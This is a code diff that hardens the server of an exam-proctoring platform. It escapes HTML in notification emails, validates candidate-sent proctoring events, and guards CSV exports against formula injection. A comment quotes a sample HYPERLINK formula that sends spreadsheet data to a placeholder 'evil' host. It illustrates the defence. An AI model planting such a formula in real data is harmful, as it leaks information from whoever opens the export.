@@ -8,7 +8,7 @@ import fs from "node:fs";
 import { fileURLToPath } from "node:url";
 import { createHmac, createHash, randomBytes } from "node:crypto";
 import { db, initDb, snapshotStore, proctorStore, answerStore, auditStore, emailStore } from "./db.ts";
-import { sendMail, mailerStatus, verifySmtp, buildHtml, ctaButton } from "./mailer.ts";
+import { sendMail, mailerStatus, verifySmtp, buildHtml, ctaButton, esc } from "./mailer.ts";
 import { sendSms, smsEnabled, smsStatus, recentSms } from "./sms.ts";
 import {
   clearSession, currentUser, issueSession, requireAuth, requireRole, requireRoles, toSafeUser,
@@ -38,7 +38,7 @@ const GRADERS: ("admin" | "facilitator")[] = ["admin", "facilitator"];
 import type {
   Answer, Attempt, Certificate, Exam, ExamListItem, ProctorEvent, PublicQuestion, Question, Registration, RubricCriterion, RegradeRequest, WebhookEvent,
 } from "../shared/types.ts";
-import { DEFAULT_LOCKDOWN, WEBHOOK_EVENTS } from "../shared/types.ts";
+import { DEFAULT_LOCKDOWN, WEBHOOK_EVENTS, PROCTOR_EVENT_TYPES } from "../shared/types.ts";
 
 /** Per-severity weight deducted from the integrity score for each logged violation. */
 const SEVERITY_WEIGHT: Record<string, number> = { high: 12, warning: 5, info: 0 };
@@ -118,13 +118,13 @@ function invitationEmail(name: string, email: string, password: string) {
     `Login:    ${email}\nPassword: ${password}\n\n` +
     `Sign in at ${loginUrl} — you can change your password after your first login.\n\n— Oriole`;
   const html = buildHtml(
-    `<p style="margin:0 0 12px;font-size:15px;color:#111827"><strong>Hi ${name},</strong></p>
+    `<p style="margin:0 0 12px;font-size:15px;color:#111827"><strong>Hi ${esc(name)},</strong></p>
      <p style="margin:0 0 16px">An account has been created for you on <strong>Oriole</strong>. Use the credentials below to sign in.</p>
      <table role="presentation" cellpadding="0" cellspacing="0" style="background:#f9fafb;border:1px solid #e5e7eb;border-radius:6px;padding:14px 18px;margin:0 0 20px;width:100%">
        <tr><td style="font-size:13px;color:#6b7280;padding-bottom:4px">Email</td></tr>
-       <tr><td style="font-size:15px;font-weight:700;color:#111827;padding-bottom:12px">${email}</td></tr>
+       <tr><td style="font-size:15px;font-weight:700;color:#111827;padding-bottom:12px">${esc(email)}</td></tr>
        <tr><td style="font-size:13px;color:#6b7280;padding-bottom:4px">Temporary password</td></tr>
-       <tr><td style="font-size:15px;font-weight:700;color:#111827;font-family:monospace">${password}</td></tr>
+       <tr><td style="font-size:15px;font-weight:700;color:#111827;font-family:monospace">${esc(password)}</td></tr>
      </table>
      <p style="margin:0 0 4px;font-size:13px;color:#6b7280">You will be asked to change your password after your first login.</p>
      ${ctaButton("Sign in to Oriole", loginUrl)}`,
@@ -539,8 +539,8 @@ async function notifyResultReleased(attempt: Attempt) {
     `Score: ${scoreLabel}\n\n` +
     `View the full breakdown at ${resultUrl}${attempt.passed ? "\nYour certificate is also available to download." : ""}\n\n— Oriole`;
   const html = buildHtml(
-    `<p style="margin:0 0 12px;font-size:15px;color:#111827"><strong>Hi ${u.name},</strong></p>
-     <p style="margin:0 0 16px">Your result for <strong>${title}</strong> is now available.</p>
+    `<p style="margin:0 0 12px;font-size:15px;color:#111827"><strong>Hi ${esc(u.name)},</strong></p>
+     <p style="margin:0 0 16px">Your result for <strong>${esc(title)}</strong> is now available.</p>
      <table role="presentation" cellpadding="0" cellspacing="0" style="background:#f9fafb;border:1px solid #e5e7eb;border-radius:6px;padding:14px 18px;margin:0 0 20px;width:100%">
        <tr><td style="font-size:13px;color:#6b7280;padding-bottom:4px">Score</td></tr>
        <tr><td style="font-size:22px;font-weight:700;color:${attempt.passed ? "#059669" : "#dc2626"}">${attempt.score}%</td></tr>
@@ -566,8 +566,8 @@ async function notifyRegistered(reg: Registration) {
     `Hi ${u.name},\n\nYou're confirmed to sit "${title}". It opens ${when}.\n\n` +
     `Sign in ahead of time to run your system check so you're ready to start.\n${portalUrl}\n\n— Oriole`;
   const html = buildHtml(
-    `<p style="margin:0 0 12px;font-size:15px;color:#111827"><strong>Hi ${u.name},</strong></p>
-     <p style="margin:0 0 16px">You are confirmed to sit <strong>${title}</strong>.</p>
+    `<p style="margin:0 0 12px;font-size:15px;color:#111827"><strong>Hi ${esc(u.name)},</strong></p>
+     <p style="margin:0 0 16px">You are confirmed to sit <strong>${esc(title)}</strong>.</p>
      <table role="presentation" cellpadding="0" cellspacing="0" style="background:#f9fafb;border:1px solid #e5e7eb;border-radius:6px;padding:14px 18px;margin:0 0 20px;width:100%">
        <tr><td style="font-size:13px;color:#6b7280;padding-bottom:4px">Opens</td></tr>
        <tr><td style="font-size:15px;font-weight:700;color:#111827">${when}</td></tr>
@@ -599,8 +599,8 @@ async function sendExamReminders() {
       const portalUrl = `${env.appUrl}/exams`;
       const text = `Hi ${u.name},\n\n"${exam.title}" starts ${label} (${when}).\nMake sure you're ready and run your system check beforehand.\n${portalUrl}\n\n— Oriole`;
       const html = buildHtml(
-        `<p style="margin:0 0 12px;font-size:15px;color:#111827"><strong>Hi ${u.name},</strong></p>
-         <p style="margin:0 0 16px">This is a reminder that <strong>${exam.title}</strong> starts <strong>${label}</strong>.</p>
+        `<p style="margin:0 0 12px;font-size:15px;color:#111827"><strong>Hi ${esc(u.name)},</strong></p>
+         <p style="margin:0 0 16px">This is a reminder that <strong>${esc(exam.title)}</strong> starts <strong>${label}</strong>.</p>
          <table role="presentation" cellpadding="0" cellspacing="0" style="background:#f9fafb;border:1px solid #e5e7eb;border-radius:6px;padding:14px 18px;margin:0 0 20px;width:100%">
            <tr><td style="font-size:13px;color:#6b7280;padding-bottom:4px">Starts at</td></tr>
            <tr><td style="font-size:15px;font-weight:700;color:#111827">${when}</td></tr>
@@ -660,7 +660,7 @@ function buildDigest(sinceMs: number, periodLabel: string): { subject: string; t
 
   const html = buildHtml(
     `<p style="margin:0 0 6px;font-size:13px;color:#6b7280;text-transform:uppercase;letter-spacing:.5px">${periodLabel} summary</p>
-     <p style="margin:0 0 20px;font-size:17px;font-weight:700;color:#111827">${org}</p>
+     <p style="margin:0 0 20px;font-size:17px;font-weight:700;color:#111827">${esc(org)}</p>
      <table role="presentation" cellpadding="0" cellspacing="0" style="width:100%;border-top:1px solid #f0f0f0;margin-bottom:20px">
        ${stat("New submissions", newSubs.length, avg !== null ? `avg ${avg}% · ${passed} passed` : "")}
        ${stat("In progress now", inProgress)}
@@ -964,12 +964,22 @@ app.post("/api/attempts/:id/proctor-event", requireAuth, async (req, res) => {
   // beacon that arrives after finishing) from being recorded as violations.
   if (attempt.status === "submitted") return res.json({ ok: true, ignored: "submitted" });
   const { type, severity, message } = req.body ?? {};
+  // This payload is candidate-controlled, so validate it against the known event
+  // vocabulary: an unrecognised `type` is rejected (a tampered client can't inject
+  // arbitrary strings into the proctoring timeline), the severity is clamped to the
+  // known set (an unknown value would score as 0 and could hide a real flag), and
+  // the free-text message is length-capped so it can't bloat stored data.
+  if (!(PROCTOR_EVENT_TYPES as readonly string[]).includes(type)) {
+    return res.status(400).json({ error: "Unknown event type." });
+  }
+  const safeSeverity: ProctorEvent["severity"] =
+    severity === "warning" || severity === "high" ? severity : "info";
   const event: ProctorEvent = {
     id: nanoid(10),
     attemptId: attempt.id,
     type,
-    severity: severity ?? "info",
-    message: message ?? "",
+    severity: safeSeverity,
+    message: String(message ?? "").slice(0, 500),
     at: now(),
   };
   await proctorStore.add(event);
@@ -3592,8 +3602,16 @@ app.get("/api/admin/integrity", requireRoles(...GRADERS), async (_req, res) => {
 });
 
 // ---- admin: Reports — summary + CSV exports ----
+// Rows include candidate-controlled fields (self-set display name via
+// /api/me/profile), so every cell must be defused against CSV/formula
+// injection (CWE-1236): a name like `=HYPERLINK("http://evil/leak?"&A2,"x")`
+// becomes a live, executing formula the moment an admin opens the export in
+// Excel/Sheets/LibreOffice. Cells starting with =, +, -, @, or a tab/CR are
+// prefixed with a single quote, which every major spreadsheet app renders as
+// literal text instead of evaluating as a formula.
 const csvEscape = (v: unknown) => {
-  const s = String(v ?? "");
+  let s = String(v ?? "");
+  if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
   return /[",\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
 };
 const toCsv = (headers: string[], rows: unknown[][]) =>
